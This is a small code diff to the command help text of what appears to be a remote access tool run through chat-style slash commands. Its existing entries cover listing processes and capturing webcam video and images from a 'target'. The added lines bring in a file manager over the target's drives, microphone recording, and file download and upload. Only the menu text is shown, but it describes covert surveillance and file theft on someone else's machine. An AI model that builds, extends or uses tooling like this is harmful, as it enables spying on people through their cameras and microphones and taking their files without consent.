@@ -16,6 +16,10 @@ commands = '''
 /ps - process list
 /webcam 5 - record video (secs)
 /webcam - screenshot from camera
+/fm - filemanager
+/fm /home or /fm C:\
+/mic 10 - record audio from mic
+Press button to download file
 Send any file as file for upload to target'''
 
 
